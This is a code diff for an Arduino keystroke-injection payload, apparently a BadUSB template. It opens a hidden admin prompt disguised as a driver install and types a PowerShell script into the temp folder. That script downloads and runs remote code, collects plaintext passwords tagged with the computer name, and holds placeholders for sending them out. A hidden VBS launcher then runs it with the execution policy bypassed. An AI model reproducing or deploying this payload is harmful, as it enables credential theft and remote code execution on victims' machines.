@@ -11,14 +11,21 @@ void setup(){
 
   minimise_windows();
   delay(500);
-  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
+  while(!cmd_admin(3,500))
   {
   reset_windows_desktop(2000);
   }
-
-  Keyboard.println("echo iex ((New-Object Net.WebClient).DownloadString(\"INPUT0\")); > %temp%\\dlp.ps1");
-  Keyboard.println("echo iex INPUT1 >> %temp%\\dlp.ps1");
+  Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  Passwords in plain-text\" > %temp%\\dlp.ps1");
+  Keyboard.println("echo $user = \"INPUT1\" >> %temp%\\dlp.ps1");
+  Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\dlp.ps1");
+  Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\dlp.ps1");
+  Keyboard.println("echo iex ((New-Object Net.WebClient).DownloadString(\"INPUT4\")); >> %temp%\\dlp.ps1");
+  Keyboard.println("echo $pv = iex (INPUT5) >> %temp%\\dlp.ps1");
   delay(2000);
+
+  String fn = "dlp";
+  String fp;
+  EXFILCALLS
 
   Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dlp.vbs");
   Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dlp.ps1\"),0,true >> %temp%\\dlp.vbs");
@@ -34,4 +41,4 @@ void loop(){
 }
 
 DEFS
-
+EXFILDEFS
